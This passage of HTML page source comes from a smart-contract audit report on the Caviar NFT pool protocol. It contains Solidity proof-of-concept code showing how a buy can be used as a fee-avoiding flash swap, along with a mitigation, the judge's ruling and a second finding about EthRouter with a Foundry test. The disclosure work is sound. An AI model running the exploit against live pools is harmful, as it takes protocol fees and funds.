class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">shibaInu</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">), </span><span class=\"mtk12\">netInputAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// @audit-info Trying to buy the 5 tokens present in the pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">buy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenWeights</span><span class=\"mtk1\">, </span><span class=\"mtk12\">proofs</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onERC721Received</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">operator</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bytes4</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// @audit-info Claim airdrop for the specific NFT here</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">airdrop</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claim</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// @audit-info Selling the NFT here</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tokenIds</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">_tokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">milady</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">), </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">netInputAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sellQuote</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sell</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tokenIds</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenWeights</span><span class=\"mtk1\">, </span><span class=\"mtk12\">proofs</span><span class=\"mtk1\">, </span><span class=\"mtk12\">stolenNftProofs</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">bytes4</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;onERC721Received(address,address,uint256,bytes)&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"tools-used-1\" style=\"position:relative;\"><a href=\"#tools-used-1\" aria-label=\"tools used 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Foundry</p>\n<h3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider sending the NFTs after the funds have been received by the contract.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/885\">outdoteth (Caviar) acknowledged</a></strong> </p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/885#issuecomment-1529117611\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how, due to the handling of callbacks, a <code>buy</code> can be viewed as a flash-swap which allows the payer to pay after using the token, effectively allowing for a cheaper flashloan if fees are set in a certain way.</p>\n<p>Because the finding shows a way to possibly side-step fees, while maintaining the same functionality, I believe the most appropriate severity to be Medium.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-02-ethrouter-cant-perform-multiple-changes\" style=\"position:relative;\"><a href=\"#m-02-ethrouter-cant-perform-multiple-changes\" aria-label=\"m 02 ethrouter cant perform multiple changes permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/873\">[M-02] EthRouter can’t perform multiple changes</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/873\">minhtrng</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/863\">adriro</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/850\">Voyvoda</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/633\">ych18</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/547\">0xRobocop</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/360\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/268\">chaduke</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/209\">Ruhum</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/195\">ladboy233</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/127\">0x4db5362c</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/103\">Kek</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/46\">BradMoon</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/31\">ChrisTina</a>, and <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/26\">Rappie</a></em></p>\n<p>EthRouter is meant to support multiple changes in one tx, but that would fail.</p>\n<h3 id=\"proof-of-concept-3\" style=\"position:relative;\"><a href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The function <code>EthRouter.change</code> sends <code>msg.value</code> to pool in a for loop:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"18\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">changes</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Change</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_change</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">changes</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// execute change</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">PrivatePool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_change</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">).</span><span class=\"mtk12\">change</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">}(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_change</span><span class=\"mtk1\">.</span><span class=\"mtk12\">inputTokenIds</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_change</span><span class=\"mtk1\">.</span><span class=\"mtk12\">inputTokenWeights</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_change</span><span class=\"mtk1\">.</span><span class=\"mtk12\">inputProof</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_change</span><span class=\"mtk1\">.</span><span class=\"mtk12\">stolenNftProofs</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_change</span><span class=\"mtk1\">.</span><span class=\"mtk12\">outputTokenIds</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_change</span><span class=\"mtk1\">.</span><span class=\"mtk12\">outputTokenWeights</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_change</span><span class=\"mtk1\">.</span><span class=\"mtk12\">outputProof</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span></code></pre>\n<p>The pool subtracts the fee, and sends the rest back to the router. After the first iteration the router contains less ETH than <code>msg.value</code> and will revert</p>\n<p>Add to <code>Change.t.sol</code> and run with <code>forge test --match test_twoChanges -vvvv</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"19\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_twoChangesOneCall</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">inputTokenIds</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">inputTokenWeights</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">outputTokenIds</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">outputTokenWeights</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">inputTokenIds2</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">inputTokenWeights2</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">outputTokenIds2</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">outputTokenWeights2</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">inputTokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">5</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">outputTokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">inputTokenIds2</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">6</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">outputTokenIds2</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">EthRouter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Change</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">changes</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">EthRouter</span><span class=\"mtk1\">.</span><span class=\"mtk10\">Change</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">changes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">EthRouter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">Change</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">pool:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">nft:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">milady</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">inputTokenIds:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">inputTokenIds</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">inputTokenWeights:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">inputTokenWeights</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">inputProof:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">MerkleMultiProof</span><span class=\"mtk1\">(</span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bytes32</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bool</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">stolenNftProofs:</span><span class=\"mtk1\"> </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">IStolenNftOracle</span><span class=\"mtk1\">.</span><span class=\"mtk10\">Message</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">outputTokenIds:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">outputTokenIds</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">outputTokenWeights:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">outputTokenWeights</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">outputProof:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">MerkleMultiProof</span><span class=\"mtk1\">(</span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bytes32</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bool</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">changes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">EthRouter</span><span class=\"mtk1\">.</span><span class=\"mtk11\">Change</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">pool:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">nft:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">milady</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">inputTokenIds:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">inputTokenIds2</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">inputTokenWeights:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">inputTokenWeights2</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">inputProof:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">MerkleMultiProof</span><span class=\"mtk1\">(</span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bytes32</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bool</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">stolenNftProofs:</span><span class=\"mtk1\"> </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">IStolenNftOracle</span><span class=\"mtk1\">.</span><span class=\"mtk10\">Message</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">outputTokenIds:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">outputTokenIds2</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">outputTokenWeights:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">outputTokenWeights2</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span 